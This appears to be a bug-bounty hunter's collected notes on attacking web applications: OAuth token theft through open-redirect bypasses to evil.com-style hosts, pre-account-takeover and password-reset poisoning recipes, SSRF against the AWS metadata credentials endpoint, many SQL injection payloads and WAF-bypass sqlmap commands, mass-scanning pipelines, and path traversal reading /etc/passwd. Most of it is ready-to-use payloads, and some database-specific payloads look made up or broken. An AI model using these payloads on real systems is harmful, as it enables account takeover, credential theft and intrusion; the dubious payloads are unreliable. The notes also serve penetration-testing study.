<dd>

Recent findings about 8 Oauth tokens stealing via open redirect filter bypass from multiple programs. But sadly all were previously & internal duplicates

Payloads:  
?redirect\_to=target[.]com@evil[.]com  
?redirect\_Url=evil[.]com/target[.]com

</dd>
</dl>

</details>

<details>
<summary>Account Takeover Tip 1:</summary>

<dl>
<dd>

Let's say there is User A / Attacker

1. User A: Signs up using Google OAuth (Gmail)

2. User A: Completed his profile information and now uses the application properly

3. Attacker: Now sign up using the traditional registration way using email:password and uses the User A email which was previously registered using the Google OAuth

4. Attacker: Got asked for email verification

5. Attacker: Ignores the verification since User A already verified the email when he signed up using Google OAuth:- which means email verification bypassed

6. Attacker: Now tries to login using the password he set during registration

7. Attacker: Logged in into User A account and it has all the data that User A set after he signed up using the Google OAuth = Account Takeover.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Issue 3 `path-travasel technique`</summary>

<dl>
<dd>

<details>
<summary>Stealing codes and access tokens via a proxy page</summary>

<dl>
<dd>

Against more robust targets, you might find that no matter what you try, you are unable to successfully submit an external domain as the `redirect_uri`. However, that doesn't mean it's time to give up.

By this stage, you should have a relatively good understanding of which parts of the URI you can tamper with. The key now is to use this knowledge to try and access a wider attack surface within the client application itself. In other words, try to work out whether you can change the `redirect_uri` parameter to point to any other pages on a whitelisted domain.

Try to find ways that you can successfully access different subdomains or paths. For example, the default URI will often be on an OAuth-specific path, such as `/oauth/callback`, which is unlikely to have any interesting subdirectories. However, you may be able to use directory traversal tricks to supply any arbitrary path on the domain. Something like this:

```
https://client-app.com/oauth/callback/../../example/path
```

May be interpreted on the back-end as:

```
https://client-app.com/example/path
```

Once you identify which other pages you are able to set as the redirect URI, you should audit them for additional vulnerabilities that you can potentially use to leak the code or token. For the authorization code flow, you need to find a vulnerability that gives you access to the query parameters, whereas for the implicit grant type, you need to extract the URL fragment.

One of the most useful vulnerabilities for this purpose is an open redirect. You can use this as a proxy to forward victims, along with their code or token, to an attacker-controlled domain where you can host any malicious script you like.

Note that for the implicit grant type, stealing an access token doesn't just enable you to log in to the victim's account on the client application. As the entire implicit flow takes place via the browser, you can also use the token to make your own API calls to the OAuth service's resource server. This may enable you to fetch sensitive user data that you cannot normally access from the client application's web UI.

In addition to open redirects, you should look for any other vulnerabilities that allow you to extract the code or token and send it to an external domain. Some good examples include:

- **Dangerous JavaScript that handles query parameters and URL fragments**For example, insecure web messaging scripts can be great for this. In some scenarios, you may have to identify a longer gadget chain that allows you to pass the token through a series of scripts before eventually leaking it to your external domain.

- **XSSvulnerabilities**Although XSS attacks can have a huge impact on their own, there is typically a small time frame in which the attacker has access to the user's session before they close the tab or navigate away. As the `HTTPOnly` attribute is commonly used for session cookies, an attacker will often also be unable to access them directly using XSS. However, by stealing an OAuth code or token, the attacker can gain access to the user's account in their own browser. This gives them much more time to explore the user's data and perform harmful actions, significantly increasing the severity of the XSS vulnerability.

- **HTML injection vulnerabilities**In cases where you cannot inject JavaScript (for example, due to CSP constraints or strict filtering), you may still be able to use a simple HTML injection to steal authorization codes. If you can point the `redirect_uri` parameter to a page on which you can inject your own HTML content, you might be able to leak the code via the `Referer` header. For example, consider the following `img` element: `<img src="evil-user.net">`. When attempting to fetch this image, some browsers (such as Firefox) will send the full URL in the `Referer` header of the request, including the query string.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Flawed scope validation</summary>

<dl>
<dd>

<details>
<summary></summary>



</details>

</dd>
</dl>

</details>

<details>
<summary>Unverified user registration</summary>

<dl>
<dd>

When authenticating users via OAuth, the client application makes the implicit assumption that the information stored by the OAuth provider is correct. This can be a dangerous assumption to make.

Some websites that provide an OAuth service allow users to register an account without verifying all of their details, including their email address in some cases. An attacker can exploit this by registering an account with the OAuth provider using the same details as a target user, such as a known email address. Client applications may then allow the attacker to sign in as the victim via this fraudulent account with the OAuth provider.

</dd>
</dl>

</details>

<details>
<summary>signin/signup with Facebook flaw</summary>

<dl>
<dd>

<details>
<summary>Case 1 `Pre Account Takeover`</summary>

<dl>
<dd>

1. If website has signup with facebook option

2. Click on `Signin/Register` >> `Continue with Facebook icon`

3. Now the facebook pop-up page will appear , click on `Edit Access` --- turn off `Email option` --- Click Continue.

4. Now the attacker enters the email of victim and the account is created on behalf of the victim email.

5. Now unaware victim decides to register in target.com website using same email.

6. And finally, now both the attacker and victim has access to the account.

7. Attacker has full control over this victim account while victim user is unaware at all.

</dd>
</dl>

</details>

<details>
<summary>Case 2</summary>

<dl>
<dd>

Here are the brief steps:  
(1) Went to http://example.com , used Login with Facebook (Unchecked share email on Facebook)   
(2) The target site asked to enter an email to link my FB account as no email was shared from FB. Entered victim@example.com, a confirmation link was sent to the victim's email to bind the account.   
(3) Repeated the same steps on the target site using the same FB account, this time choose to link attacker@example.com on target site – received the same link as step (2) on the attacker controlled email!   
(4) Knowing this, repeated the same steps again to link victim@example.com, and used earlier link which was received on attacker@example.com to takeover victim@example.com account.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Incase OpenID mechanism is used by web-app , then</summary>

<dl>
<dd>

<details>
<summary>OpenID Connect vulnerabilities</summary>

<dl>
<dd>

<details>
<summary>1. Unprotected dynamic client registration :</summary>

<dl>
<dd>

The OpenID specification outlines a standardized way of allowing client applications to register with the OpenID provider. If dynamic client registration is supported, the client application can register itself by sending a `POST` request to a dedicated `/registration` endpoint. The name of this endpoint is usually provided in the configuration file and documentation.

In the request body, the client application submits key information about itself in JSON format. For example, it will often be required to include an array of whitelisted redirect URIs. It can also submit a range of additional information, such as the names of the endpoints they want to expose, a name for their application, and so on. A typical registration request may look something like this:

```
POST /openid/register HTTP/1.1
Content-Type: application/json
Accept: application/json
Host: oauth-authorization-server.com
Authorization: Bearer ab12cd34ef56gh89

{
    "application_type": "web",
    "redirect_uris": [
        "https://client-app.com/callback",
        "https://client-app.com/callback2"
        ],
    "client_name": "My Application",
    "logo_uri": "https://client-app.com/logo.png",
    "token_endpoint_auth_method": "client_secret_basic",
    "jwks_uri": "https://client-app.com/my_public_keys.jwks",
    "userinfo_encrypted_response_alg": "RSA1_5",
    "userinfo_encrypted_response_enc": "A128CBC-HS256",
    …
}
```

The OpenID provider should require the client application to authenticate itself. In the example above, they're using an HTTP bearer token. However, some providers will allow dynamic client registration without any authentication, which enables an attacker to register their own malicious client application. This can have various consequences depending on how the values of these attacker-controllable properties are used.

For example, you may have noticed that some of these properties can be provided as URIs. If any of these are accessed by the OpenID provider, this can potentially lead to second-order SSRF vulnerabilities unless additional security measures are in place.

</dd>
</dl>

</details>

<details>
<summary>2. Allowing authorization requests by reference</summary>

<dl>
<dd>

Up to this point, we've looked at the standard way of submitting the required parameters for the authorization request i.e. via the query string. Some OpenID providers give you the option to pass these in as a JSON web token (JWT) instead. If this feature is supported, you can send a single `request_uri` parameter pointing to a JSON web token that contains the rest of the OAuth parameters and their values. Depending on the configuration of the OAuth service, this `request_uri` parameter is another potential vector for SSRF.

You might also be able to use this feature to bypass validation of these parameter values. Some servers may effectively validate the query string in the authorization request, but may fail to adequately apply the same validation to parameters in a JWT, including the `redirect_uri`.

To check whether this option is supported, you should look for the `request_uri_parameter_supported` option in the configuration file and documentation. Alternatively, you can just try adding the `request_uri` parameter to see if it works. You will find that some servers support this feature even if they don't explicitly mention it in their documentation.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>SSRF via OpenID dynamic client registration</summary>

<dl>
<dd>

OpenID Connect 1.0 is a simple identity layer on the OAuth 2.0 protocol. While OAuth 2.0 is about resource access and sharing, OIDC is about user authentication. It allows Clients to verify the identity of the End-User based on the authentication performed by an Authorization Server, as well as to obtain basic profile information about the End-User in an interoperable and REST-like manner.

The OpenID specification outlines a standardized way of allowing client applications to register with the OpenID provider. If dynamic client registration is supported, the client application can register by sending a POST request to a dedicated /registration endpoint.

# **Attack scenario**

An OAuth registration endpoint is available on the following test website, allowing dynamic registration via client applications. There's a potential vector for SSRF due to the OAuth service's unsafe use of client-specific data.

After the Initial recon, we can find the configuration file that can give us the endpoint for the registration.

![](https://www.cobalt.io/hs-fs/hubfs/oauth-vulnerabilites-example-8.png?width=750&height=361&name=oauth-vulnerabilites-example-8.png)

You can create a suitable POST request to register your client application with the OAuth service. You must provide a redirect\_uris array containing an arbitrary whitelist of callback URIs for your fake application.

![](https://www.cobalt.io/hs-fs/hubfs/oauth-vulnerabilites-example-9.png?width=750&height=425&name=oauth-vulnerabilites-example-9.png)

We know from the OpenID specification that client applications can provide the URL for their logo using the logo\_uri property during dynamic registration. This client id can fetch the logo for the specific client.

Go back to the POST /reg request in Repeater and replace the current logo\_uri value with the target URL:

"logo\_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"

![](https://www.cobalt.io/hs-fs/hubfs/oauth-vulnerabilites-example-10.png?width=750&height=420&name=oauth-vulnerabilites-example-10.png)

Now visit the logo for the client ID mentioned in response to get the access token from the AWS manager.

![](https://www.cobalt.io/hs-fs/hubfs/oauth-vulnerabilites-example-11.png?width=750&height=277&name=oauth-vulnerabilites-example-11.png)

</dd>
</dl>

</details>

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Checklist</summary>

<dl>
<dd>

1. Open Redirection to OAuth token stealing: changing redirect\_uri to bing.com; use IDN Homograph; other bypasses.

2. Change Referral header to bing.com while requesting OAuth.

```
GET /oauth/token/google HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
...
Referer: https://evil.com
```

1. Pre Account Takeover: Create an account with victim@gmail.com with normal functionality. Create account with victim@gmail.com using OAuth functionality. Now try to login using previous credentials.

2. OAuth Token Re-use.

3. Missing or broken state parameter (CSRF Bypass)

4. Lack of origin check (Lack\_Of\_Origin\_Check.html)

5. Open Redirection on another endpoint ---> Redirect to that endpoint via redirect\_uri

6. Look for additional parameters in the requests. For example, if there is an email parameter after signin (i.e. code=OAUTH\_TOKEN&state=ANTI.CSRF.TOKEN&email=attacker@gmail.com) then try to change the email parameter to victim's email.

7. Try to remove email from the scope and add victim's email manually.

8. Only company's email is allowed? Replace `hd=company.com` to `hd=gmail.com`

9. Check for client\_secret parameter in burp search/github dorking.

10. Go to the browser history and check if the token is present in the history.

11. Facebook OAuth Misconfiguration: https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Account Takeover Tip</summary>

<dl>
<dd>

<details>
<summary>Tip 1</summary>

<dl>
<dd>

Account takeover tips  
1.Create an account  
2.For the attacker and the victim to  
3.Reset password

{  
"email":"victim",  
"email":"attacker";  
}

</dd>
</dl>

</details>

<details>
<summary>Tip 2</summary>

<dl>
<dd>

1.Go to reset password

2.Enter your Email and intercept request

3.change Host+Referrer+origin  
With your server

4.Victim will receive yourserver/token=$

5.When He Click on Link you will got token

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Authentication bypass weird bug</summary>

<dl>
<dd>

<details>
<summary>Tip 1</summary>

<dl>
<dd>

For a ; in an URL such as:

https://api.redacted.com/api/;/admin

Always try 403 bypasses when you go a redirect to an login page.

</dd>
</dl>

</details>

<details>
<summary>Tip 2</summary>

<dl>
<dd>

try creating account with Email “no-reply@example.com” on main web app and login to dashboard with SSO.

</dd>
</dl>

</details>

<details>
<summary>Tip 3</summary>

<dl>
<dd>

1. Authentication Bypass by setting session cookie value to 'null'

2. Plain text credentials in JS files expose clients' PII

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Bugs to try in Signup</summary>

<dl>
<dd>

- Duplicate registration / Overwrite existing user

- DOS at Name/Password field in Signup Page By sending a very long string (100000 characters)

- XSS in username, account name for registration

- IDN homograph to account takeover

</dd>
</dl>

</details>

<details>
<summary>Authorization bugs</summary>

<dl>
<dd>

Sometimes it's worth to check if Authorization Bearer are properly validated with different HTTP verbs.

1. Completely Remove Authorization bearer from request with different verbs like : DELETE, PUT, GET and more.

<details>
<summary>Tip 2https://twitter.com/harshad_hacker/status/1557230593053986816?s=20&t=aVdmeG-2AI_vi_Gow2DP4w</summary>



</details>

</dd>
</dl>

</details>

<details>
<summary>Testing by Auth Bearer/ Auth cookie</summary>

<dl>
<dd>

If you get an Authorization Bearer token or Auth Cookie on one domain/site, try it on ALL other domains/sites the target owns to see if it grants access. Sometimes targets only check if token is present/valid, not the access level.

Do this using Burp intruder where the payload is a list of hosts. Usually run it once without auth and record which domains return 401/403, then run it again with auth for just those 401/403 domains and if they return 200/404 etc, usually it = win.

</dd>
</dl>

</details>

<details>
<summary>Pre Account takeover</summary>

<dl>
<dd>

The attack works by first manually creating an account using the target's email address. Later if the target goes to create an account or login using SSO they will be linked to the same account. That means that you will be able to access the target account via the credentials you set up earlier . Its basically a backdoor that allows you to take over the account the SSO user is logged into.

Note: only works if there is no email verification and the google/other sso automatically connects with same email account.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Open redirect</summary>

<dl>
<dd>

<details>
<summary>LFI & SSRF & Open Redirect Burp search regex</summary>

<dl>
<dd>

Quick and dirty way to find parameters vulnerable to LFI & Path Traversal & SSRF & Open Redirect:  
Burp Search > Regex  
\?.\*=(\/\/?\w+|\w+\/|\w+(%3A|:)(\/|%2F)|%2F|[\.\w]+\.\w{2,4}[^\w])

</dd>
</dl>

</details>

<details>
<summary>Tip</summary>

<dl>
<dd>

1. If you are testing Open Redirect but there is a blacklisted character, you can test it with a chinese dot to bypass it or any other Unicode Character.  
   example: redirect\_to=////evil%E3%80%82com

2. Account Login > open redirect

Steps:  
 1.Take this url : https://target.com///bing.com

2. Login your Account  
 3. Now we will be redirected http://bing.com

3. https://twitter.com/therceman/status/1573749312613502978?s=20&t=WgwzZjVAY7IkkAxRYAOAEA

</dd>
</dl>

</details>

<details>
<summary>Tip 2</summary>

<dl>
<dd>

when you are looking for bugs like SSRF & Open Redirect.  
and there is a blacklisted character.  
try to bypassed using other Unicode characters.  
I found Open Redirect Bypass Using (。) Chinese dot "%E3%80%82".  
poc: redirect\_to=////evil%E3%80%82com

also : http:0xd83ad6ce

</dd>
</dl>

</details>

<details>
<summary>HTMLi to open redirect</summary>

<dl>
<dd>

Tried everything 403 forbidden

Tried this Payload : ">Redirect Worked fine

HTMLi to Open Redirection was Possible

escalate : %25%33%63%61%20%3Ciframe%20src%3d%22https://bing.com%22%3E%3C/iframe%3E

</dd>
</dl>

</details>

<details>
<summary>Tip 3</summary>

<dl>
<dd>

Check logout parameter inject domain to redirect to

</dd>
</dl>

</details>

<details>
<summary>redirection validation bypass</summary>

<dl>
<dd>

<details>
<summary>Open redirect allowed to google.com , nothing else `case`</summary>

<dl>
<dd>

Google has a built in Open Redirect you can chain:  
https://google[.]com/amp/s/poc.rhynorater.com

</dd>
</dl>

</details>

<details>
<summary>Freaking good redirect validation bypass payload:</summary>

<dl>
<dd>

1. http://attacker.com\@test.com  
   The backslash will be normalized to a slash by the browser and result in the OR. I see this issue a lot.

2. https://attacker.com\.attackeTarget.com

</dd>
</dl>

</details>

<details>
<summary>Another one</summary>

<dl>
<dd>

Found an interesting open redirect bypass today. Target would only allow \*.target.com, but if you entered hxxp://evil.com%EF%BC%http://A1.target.com, the backed would return hxxp://evil.com/?.target.com

</dd>
</dl>

</details>

<details>
<summary>Another one</summary>

<dl>
<dd>

http://example(.)com/app?origin=https://evil(.)com - Forbidden

http://example(.)com/app?origin=http:/evil.com redirect -> http://evil.com/?authToken=eyJ

....

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Finding the Whitelist Words to bypass the Open-Redirect Filter:</summary>

<dl>
<dd>

<details>
<summary>story :</summary>

<dl>
<dd>

`ffuf -w words.txt -u https://www.target.com/endpoint?u=https://www.FUZZ.com/`

and I found some websites is in the whitelist like google.com, youtube.com, twitter.com, rss-twitter.com, share-twitter.com ...

Ummm... . share-twitter.com, rss-twitter.com I tried visiting those domains in my browser and I found both of them are expired and I can buy that domains!! OHHH! I immediately Reported the bypass:

Bypass Open Redirect Filter through buy that domains

After some hours, Reporting the open redirect bypass I realized that maybe that website is not in whitelist but “twitter” word which is in whitelist and that's what i found the twitter word is in whitelist so we can redirect user to any website thats contain twitter word in the end of the url like:

```html
https://www.target.com/endpoint?u=https://abdtwitter.com/
```

</dd>
</dl>

</details>

<details>
<summary>Wordlist</summary>

<dl>
<dd>

https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt

</dd>
</dl>

</details>

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>SQLi</summary>

<dl>
<dd>

<details>
<summary>Detection :</summary>

<dl>
<dd>

You can detect SQL injection manually using a systematic set of tests against every entry point in the application. To do this, you would typically submit:

- The single quote character `'` and `'—` and look for errors or other anomalies.

- Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.

- Boolean conditions such as `OR 1=1` and `OR 1=2`, and look for differences in the application's responses.

- Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.

- OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.

<details>
<summary>Create customized detection payloads for specific databases of web-apps :</summary>



</details>

<details>
<summary>Tip</summary>

<dl>
<dd>

Best methods I've had is manually testing for SQL behavior via application logic. E.g. what responses with param=1, param=-1, param=1/1, param='1', param=1'--

Even with a working query on an identified SQL injection, I sometimes have trouble getting SQLMap to work.

</dd>
</dl>

</details>

<details>
<summary>payloads  
aa' --  
aa' #  
aa'/\*  
' or 1=1--  
' or 1=1#  
' or 1=1/\*  
') or '1'='1--  
') or ('1'='1--</summary>



</details>

</dd>
</dl>

</details>

<details>
<summary>NoSQLi</summary>

<dl>
<dd>

<details>
<summary>NoSQL databases</summary>

<dl>
<dd>

1. MongoDB

2. Cassandra

3. CouchDB

4. Redis

5. Couchbase

6. Amazon DynamoDB

7. Apache HBase

8. Neo4j

9. Riak

10. Elasticsearch

11. RavenDB

12. ArangoDB

13. MarkLogic

14. OrientDB

15. DynamoDB (Open Source)

16. Couchbase

17. Firebase

18. RocksDB

19. Aerospike

20. FaunaDB

21. Hypertable

22. Voldemort

23. Amazon SimpleDB

24. Tokyo Cabinet

25. Berkeley DB

26. RethinkDB

27. Amazon Neptune

28. Microsoft Azure Cosmos DB

29. Apache Accumulo

30. Tarantool

31. InfluxDB

32. Couch-Rest

33. PouchDB

34. Azure Table Storage

35. IBM Cloudant

36. SQreamDB

37. Hazelcast

38. RediSearch

39. LevelDB

40. Arangodb

41. Datomic

42. Amazon QLDB

43. JanusGraph

44. Kudu

45. AllegroGraph

46. GridDB

47. ScyllaDB

48. Couchstore

49. NuDB

50. Cloudera

51. Infinispan

52. TerarkDB

53. TarantoolDB

54. Gnocchi

55. FlockDB

56. NuoDB

57. YugabyteDB

58. Tarantool

59. FoundationDB

60. Rocksandra

</dd>
</dl>

</details>

<details>
<summary>All about NoSQLi</summary>

<dl>
<dd>

https://portswigger.net/web-security/nosql-injection

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Tip</summary>

<dl>
<dd>

<details>
<summary>Tip 1</summary>

<dl>
<dd>

Works best in php web-apps

User-Agent : "XOR(if(now()=sysdate(),sleep(5),0))XOR"  
===> 5.xx seconds delay

x-requested-with: 1 waitfor delay '0:0:5' --”

</dd>
</dl>

</details>

<details>
<summary>google dork</summary>

<dl>
<dd>

site:"" intext:\"sql syntax near\" | intext:\"syntax error has occurred\" | intext:\"incorrect syntax near\" | intext:\"unexpected end of SQL command\" | intext:\"Warning: mysql\_connect()\" | intext:\"Warning: mysql\_query()\" | intext:\"Warning: pg\_connect()\”

</dd>
</dl>

</details>

<details>
<summary>Tip 2</summary>

<dl>
<dd>

1. Used google dorking to find login pages :

site:\*.domain.com inurl:login | inurl:signin | intitle:Login | intitle:"sign in" | inurl:auth

2. Opened all login pages and just capture requests of login

3. Send to intruder and add those payload list

4. If any response showing delay then save it as txt file and use it in sqlmap . Wait for banner . If waf protect then tamper the script and increase level,risk

5. Here are some tips that are used to easily find sql-Injection 100%  
   /?q=1  
   /?q=1'  
   /?q=1"  
   /?q=[1]  
   /?q[]=1  
   /?q=1`  
   /?q=1\  
   /?q=1/*'*/  
   /?q=1/*!1111'*/  
   /?q=1''asd'' <== concat string  
   /?q=1 or 1=1  
   /?q='or''='  
   /?q=")  
   /?q=')  
   /?q=-x()

</dd>
</dl>

</details>

<details>
<summary>Tip 3</summary>

<dl>
<dd>

Multi-part POST request, fed bSQLI payload in all fields, got 403, bypassed using a fake input:  
Content-Disposition: form-data; language="lang\_id" with payload:  
if(now()=sysdate(),sleep(xx),0) ==>SUCCESS!!

</dd>
</dl>

</details>

<details>
<summary>Tip 4</summary>

<dl>
<dd>

1. Gather all urls from waybackurls and Google Dorking.

2. Inject SQLi payload in all parameters one by one.

3. Analyze the response.  
   Payload used: 0'XOR(if(now()=sysdate(),sleep(10),0)) XOR'Z

</dd>
</dl>

</details>

<details>
<summary>Quick SQLi scanning</summary>

<dl>
<dd>

<details>
<summary>Tip 1</summary>

<dl>
<dd>

These 5 commands can help to easily identify SQL injection on our target domain:

1. subfinder -d target.com | tee -a domains

2. cat domains | httpx | tee -a urls.alive

3. cat urls.alive | waybackurls | tee -a urls.check

4. gf sqli urls.check >> urls.sqli

5. sqlmap -m urls.sqli --dbs --batch

<details>
<summary>(For Waf bypass add this in above 5th command :</summary>

<dl>
<dd>

-level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,ifnull2ifisnull,modsecurityversioned

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Tip 2</summary>

<dl>
<dd>

Sql bugs mostly found on shodan IPs and login panels

So if we work on some target we must gather all the shodan IPs for that target and start checking on login Panels and inject sql list on intruder on all the parameters

Also injection in login , signup , forget pages is must

</dd>
</dl>

</details>

<details>
<summary>Tips</summary>

<dl>
<dd>

1. https://twitter.com/GodfatherOrwa/status/1470719738091380738?s=20&t=gKaH2wX89dkXxLpTSP9mAQ

2. https://twitter.com/ADITYASHENDE17/status/1449691218116595716?s=20&t=xwnkkWxQ-uFbVJt7kEbSGA

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Tip 5</summary>

<dl>
<dd>

When fuzzing for SQLI always try "%22" as an injection payload, just stumbled upon MariaDB fork that wouldn't show any verbose SQL errors otherwise.

https://redacted.com/path1/path2/' => 301

https://redacted.com/path1/path2/" => 301

https://redacted.com/path1/path2/%22 => 301 with SQL error

</dd>
</dl>

</details>

<details>
<summary>Tip 6</summary>

<dl>
<dd>

My first go to SQLi Injection Check is : ' /

I just saw a target that didn't return anything after using just '

but with ' /

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version error.

</dd>
</dl>

</details>

<details>
<summary>Tip 7</summary>

<dl>
<dd>

I was testing an app's #oauth2 today and randomly inject the payload "0'XOR(if(now()=sysdate(),sleep(6-2),0))XOR'Z", with php extension, and booom it was blind #SQLinjection...wt\*\*, never knew SQLi payloads can be sent using .php.

Payload : 0'XOR(if(now()=sysdate(),sleep(4\*4),0))XOR'Z.php

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Databases Tailored Payloads</summary>

<dl>
<dd>

'; IF 1=1 WAITFOR DELAY '0:0:33' --  
' OR '1'='1' --

MySQL:  
Alternative Payload: ' OR IF(1=1, SLEEP(33), 0) OR '

PostgreSQL:  
Alternative Payload: '; SELECT CASE WHEN (1=1) THEN pg\_sleep(33) ELSE 0 END; --

Microsoft SQL Server:  
Alternative Payload: '; IF (1=1) WAITFOR DELAY '0:0:33'; --

Oracle:  
Alternative Payload: '; BEGIN DBMS\_LOCK.SLEEP(33); END; --

SQLite:  
Alternative Payload: ' OR CASE WHEN 1=1 THEN (SELECT sqlite\_compileoption\_used('ENABLE\_LOAD\_EXTENSION')) ELSE 0 END; --

MariaDB:  
Alternative Payload: ' OR IF(1=1, SLEEP(33), 0) OR '

IBM Db2:  
Alternative Payload: '; IF (1=1) CALL DBMS\_ALERT.SIGNAL('sleep', '33'); --

Sybase:  
Alternative Payload: '; IF (1=1) WAITFOR DELAY '00:00:33'; --

SQLite:  
Alternative Payload: '; SELECT CASE WHEN (1=1) THEN (SELECT 1 FROM sqlite\_master AS x, sqlite\_master AS y, sqlite\_master AS z) ELSE 0 END; --

Amazon Aurora:  
Alternative Payload: '; IF (1=1) SELECT pg\_sleep(33); --

Apache Derby:  
Alternative Payload: '; CALL SYSCS\_UTIL.SYSCS\_SET\_DATABASE\_PROPERTY('derby.language.logStatementText', 'true'); --

SAP HANA:  
Alternative Payload: '; DO BEGIN WAITFOR DELAY '00:00:33'; END; --

Couchbase (NoSQL):  
Alternative Payload: ";{ $where: "sleep(33)" }

ArangoDB (Multi-model NoSQL):  
Alternative Payload: '; FOR doc IN test FILTER 1==1 RETURN SLEEP(33); --

Snowflake:  
Alternative Payload: '; COPY INTO @mystage/sleep.txt FROM (SELECT SYSTEM$WAIT(33)); --

Teradata:  
Alternative Payload: '; SELECT CASE WHEN 1=1 THEN TD\_SYSFNLIB.SLEEP(33) ELSE 0 END; --

OrientDB (Graph Database):  
Alternative Payload: '; LET $result = SLEEP(33); --

InfluxDB:  
Alternative Payload: '; SELECT SLEEP(33) FROM "measurement" WHERE "tag" = 'value'; --

CouchDB (NoSQL):  
Alternative Payload: '; { "selector": { "\_id": { "$gte": null }, "$gte": 1 }, "execution\_stats": { "sleep": 33000000000 } } --

Amazon Redshift:  
Alternative Payload: '; SELECT pg\_sleep(33); --

</dd>
</dl>

</details>

<details>
<summary>Services Tailored Payloads</summary>

<dl>
<dd>

In Php

(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'"+(select(0)from(select(sleep(6)))v)+"*/

1 in aspx

orwa';%20waitfor%20delay%20'0:0:6'%20--%20

2 in graphql  
orwa') OR 11=(SELECT 11 FROM PG\_SLEEP(6))--

</dd>
</dl>

</details>

<details>
<summary>User-Agent and other headers</summary>

<dl>
<dd>

Time-based SQLi :

1. User-Agent: "XOR(if(now()=sysdate(),sleep(5),0))XOR"   
     
   2. X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z Both   
     
   payloads were executed and the server responded after 15s. Very interesting.

2. I found 2 Blind time-based SQL Injections in X-Forwarded-For: header just using Burp Intruder. Made a list of 500+ HTTP request and tested one by one for 3+ hours, here is the result..

X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z

</dd>
</dl>

</details>

<details>
<summary>In Sitemap url</summary>

<dl>
<dd>

cat urls | httpx -silent -path 'sitemap.xml?offset=1%3bSELECT%20IF((8303%3E8302)%2cSLEEP(10)%2c2356)%23' -rt -timeout 20 -mrt '>10’

</dd>
</dl>

</details>

<details>
<summary>.php endpoints</summary>

<dl>
<dd>

when you hunt and the program language is PHP try access to any .php endpoint and test parameter 'id' and 'list[select]' for sql injection vulnerability.

</dd>
</dl>

</details>

<details>
<summary>SQLi via headers</summary>

<dl>
<dd>

0'XOR(if(now()=sysdate(),sleep(15),0))OR’

General

`X-Forwarded-For  
X-Forwarded-Host  
X-Forwarded-Proto`

Nginx

`X-Real-IP  
Forwarded`

Apache

`X-Forwarded-Server  
X-Real-IP  
Max-Forwards`

Envoy

`X-Envoy-external-adress  
X-Envoy-internal  
X-Envoy-Original-Dst-Host`

</dd>
</dl>

</details>

<details>
<summary>SQLmap</summary>

<dl>
<dd>

<details>
<summary>waf bypass command :</summary>

<dl>
<dd>

sqlmap -r login.req --dbms=mysql --level 3 --risk 3 --timeout 100 --flush-session --technique=B --time-sec=2 --dbs --threads 10 --tamper=between,informationschemacomment,bluecoat,charencode --drop-set-cookie --fresh-queries --binary-fields -identify-waf

</dd>
</dl>

</details>

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>SSO implementations</summary>

<dl>
<dd>

<details>
<summary>TIP</summary>

<dl>
<dd>

Dont trust SSO implementations, if you face a target with 302 redirect to SSO pick a wordlist and scan folders/files before redirect, you will find reachable stuff and data makes SSO useless.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Path traversal</summary>

<dl>
<dd>

<details>
<summary>Details :</summary>

<dl>
<dd>

Path traversal is also known as directory traversal. These vulnerabilities enable an attacker to read arbitrary files on the server that is running an application. This might include:

- Application code and data.

- Credentials for back-end systems.

- Sensitive operating system files.

In some cases, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server.

## **Reading arbitrary files via path traversal**

Imagine a shopping application that displays images of items for sale. This might load an image using the following HTML:

```
<img src="/loadImage?filename=218.png">
```

The `loadImage` URL takes a `filename` parameter and returns the contents of the specified file. The image files are stored on disk in the location `/var/www/images/`. To return an image, the application appends the requested filename to this base directory and uses a filesystem API to read the contents of the file. In other words, the application reads from the following file path:

```
/var/www/images/218.png
```

This application implements no defenses against path traversal attacks. As a result, an attacker can request the following URL to retrieve the `/etc/passwd` file from the server's filesystem:

```
https://insecure-website.com/loadImage?filename=../../../etc/passwd
```

This causes the application to read from the following file path:

```
/var/www/images/../../../etc/passwd
```

The sequence `../` is valid within a file path, and means to step up one level in the directory structure. The three consecutive `../` sequences step up from `/var/www/images/` to the filesystem root, and so the file that is actually read is:

```
/etc/passwd
```

On Unix-based operating systems, this is a standard file containing details of the users that are registered on the server, but an attacker could retrieve other arbitrary files using the same technique.

